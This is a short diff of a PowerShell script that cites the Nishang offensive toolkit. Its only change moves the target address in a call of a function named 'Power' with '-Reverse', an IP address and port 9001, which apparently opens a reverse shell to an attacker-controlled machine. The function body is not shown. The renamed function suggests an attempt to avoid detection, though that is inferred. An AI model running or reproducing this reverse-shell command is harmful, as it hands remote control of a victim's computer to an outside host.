@@ -125,4 +125,4 @@ https://github.com/samratashok/nishang
     }
 }
 
-Power -Reverse -IPAddress 192.168.20.143 -Port 9001
+Power -Reverse -IPAddress 192.168.10.143 -Port 9001
